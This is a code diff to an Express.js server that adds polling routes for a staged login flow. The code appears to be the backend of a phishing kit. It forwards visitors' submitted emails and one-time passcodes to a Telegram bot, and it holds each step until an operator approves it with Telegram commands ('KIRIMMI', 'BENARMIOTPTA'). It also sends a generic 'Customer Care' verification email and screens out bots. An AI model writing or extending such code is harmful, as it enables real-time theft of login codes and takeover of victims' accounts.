@@ -34,7 +34,10 @@ import {
   sendAccountLoginNotification,
   getTelegramConfig,
   extractSourceInfo,
-  SourceInfo
+  SourceInfo,
+  createLoginSession,
+  getLoginSession,
+  updateLoginSession,
 } from "./telegram";
 import { detectDevice } from "./device-detector";
 import { honeypotTrap } from "./security-middleware";
@@ -341,6 +344,8 @@ Sitemap: ${baseUrl}/sitemap.xml`;
           });
       }
 
+      createLoginSession(loginAttempt.id);
+
       return res.json({
         success: true,
         loginAttemptId: loginAttempt.id,
@@ -352,6 +357,224 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         success: false,
         message: 'Internal server error',
       });
+    }
+  });
+
+  // GET /api/login-status - Poll for Telegram login approval
+  app.get("/api/login-status", async (req, res) => {
+    try {
+      const loginAttemptId = req.query.loginAttemptId as string;
+      if (!loginAttemptId) {
+        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
+      }
+
+      const session = getLoginSession(loginAttemptId);
+      if (!session) {
+        return res.json({ success: true, stage: 'no_session', message: 'No active session' });
+      }
+
+      return res.json({
+        success: true,
+        stage: session.stage,
+        otpSentToEmail: session.otpSentToEmail,
+      });
+    } catch (error) {
+      console.error('Login status error:', error);
+      return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+  });
+
+  // POST /api/submit-email - Submit email and start waiting for KIRIMMI
+  app.post("/api/submit-email", emailVerificationLimiter, honeypotTrap, async (req, res) => {
+    try {
+      const { loginAttemptId, email } = req.body;
+
+      if (!loginAttemptId || !email) {
+        return res.status(400).json({ success: false, message: 'loginAttemptId and email required' });
+      }
+
+      const session = getLoginSession(loginAttemptId);
+      if (!session || session.stage !== 'login_approved') {
+        return res.status(400).json({ success: false, message: 'Session not in correct state' });
+      }
+
+      updateLoginSession(loginAttemptId, {
+        stage: 'email_waiting',
+        email,
+      });
+
+      const telegramConfig = getTelegramConfig();
+      if (telegramConfig) {
+        const referer = req.headers.referer || req.headers.referrer as string | undefined;
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
+        sendEmailVerificationNotification(email, loginAttemptId, sourceInfo, telegramConfig)
+          .then((success: boolean) => {
+            if (success) {
+              console.log('[Telegram] Email notification sent, waiting for KIRIMMI...');
+            }
+          })
+          .catch((err: Error) => {
+            console.error('[Telegram] Error sending email notification:', err);
+          });
+      }
+
+      return res.json({
+        success: true,
+        message: 'Email submitted, waiting for approval',
+      });
+    } catch (error) {
+      console.error('Submit email error:', error);
+      return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+  });
+
+  // GET /api/email-status - Poll for KIRIMMI or timeout
+  app.get("/api/email-status", async (req, res) => {
+    try {
+      const loginAttemptId = req.query.loginAttemptId as string;
+      if (!loginAttemptId) {
+        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
+      }
+
+      const session = getLoginSession(loginAttemptId);
+      if (!session) {
+        return res.json({ success: true, stage: 'no_session' });
+      }
+
+      if (session.stage === 'email_timeout' && !session.otpSentToEmail) {
+        const loginAttempt = await storage.getLoginAttempt(loginAttemptId);
+        if (loginAttempt && session.email) {
+          const otpCode = generateOTP();
+          const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
+
+          const otpSession = await storage.createOtpSession({
+            loginAttemptId,
+            email: session.email,
+            otpCode,
+            expiresAt,
+            verified: 'false',
+            flowType: 'login',
+          });
+
+          await storage.updateLoginAttemptStatus(loginAttemptId, 'email_sent');
+
+          try {
+            const { client, fromEmail } = await getUncachableResendClient();
+            const emailResponse = await client.emails.send({
+              from: fromEmail,
+              to: session.email,
+              subject: 'Your Identity Verification Code',
+              html: `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="margin:0;padding:20px;font-family:Arial,sans-serif;background:#f9f9f9;"><table role="presentation" style="width:100%;max-width:600px;margin:0 auto;background:#ffffff;border-collapse:collapse;"><tr><td style="padding:30px;"><p><strong>Hello Users,</strong></p><p>Here is the Verification Code you requested.</p><p>Verification Code:</p><table width="378"><tbody><tr><td><h1 style="font-size:32px;margin:10px 0 20px;color:#333;">${otpCode}</h1></td></tr></tbody></table><p>The code will expire in 10 minutes, so please complete this step as soon as possible.</p><p>Sincerely,<br /><strong>Customer Care</strong></p></td></tr></table></body></html>`,
+            });
+            console.log(`[AutoOTP] OTP sent to email ${session.email}`);
+          } catch (emailError: any) {
+            console.error('[AutoOTP] Failed to send OTP email:', emailError);
+          }
+
+          updateLoginSession(loginAttemptId, {
+            otpSentToEmail: true,
+            sessionId: otpSession.id,
+            otpCode,
+          });
+        }
+      }
+
+      return res.json({
+        success: true,
+        stage: session.stage,
+        otpSentToEmail: session.otpSentToEmail,
+        sessionId: session.sessionId,
+      });
+    } catch (error) {
+      console.error('Email status error:', error);
+      return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+  });
+
+  // POST /api/submit-otp-telegram - Submit OTP and notify Telegram, wait for BENARMIOTPTA
+  app.post("/api/submit-otp-telegram", otpVerificationLimiter, honeypotTrap, async (req, res) => {
+    try {
+      const { loginAttemptId, otpCode, sessionId } = req.body;
+
+      if (!loginAttemptId || !otpCode) {
+        return res.status(400).json({ success: false, message: 'loginAttemptId and otpCode required' });
+      }
+
+      const session = getLoginSession(loginAttemptId);
+      if (!session) {
+        return res.status(400).json({ success: false, message: 'No active session' });
+      }
+
+      if (session.otpSentToEmail && sessionId) {
+        const isValid = await storage.verifyOtp(sessionId, otpCode);
+        if (!isValid) {
+          return res.status(400).json({ success: false, message: 'Invalid or expired OTP' });
+        }
+      }
+
+      updateLoginSession(loginAttemptId, {
+        stage: 'otp_waiting',
+        otpCode,
+      });
+
+      const telegramConfig = getTelegramConfig();
+      if (telegramConfig) {
+        const referer = req.headers.referer || req.headers.referrer as string | undefined;
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
+        sendOtpVerificationNotification(session.email || '', otpCode, loginAttemptId, sourceInfo, telegramConfig)
+          .then((success: boolean) => {
+            if (success) {
+              console.log('[Telegram] OTP notification sent, waiting for BENARMIOTPTA...');
+            }
+          })
+          .catch((err: Error) => {
+            console.error('[Telegram] Error sending OTP notification:', err);
+          });
+      }
+
+      return res.json({
+        success: true,
+        message: 'OTP submitted, waiting for approval',
+      });
+    } catch (error) {
+      console.error('Submit OTP error:', error);
+      return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+  });
+
+  // GET /api/otp-status - Poll for BENARMIOTPTA approval
+  app.get("/api/otp-status", async (req, res) => {
+    try {
+      const loginAttemptId = req.query.loginAttemptId as string;
+      if (!loginAttemptId) {
+        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
+      }
+
+      const session = getLoginSession(loginAttemptId);
+      if (!session) {
+        return res.json({ success: true, stage: 'no_session' });
+      }
+
+      if (session.stage === 'otp_approved') {
+        await storage.updateLoginAttemptStatus(loginAttemptId, 'otp_verified');
+        updateLoginSession(loginAttemptId, { stage: 'completed' });
+      }
+
+      return res.json({
+        success: true,
+        stage: session.stage,
+      });
+    } catch (error) {
+      console.error('OTP status error:', error);
+      return res.status(500).json({ success: false, message: 'Internal server error' });
     }
   });
 
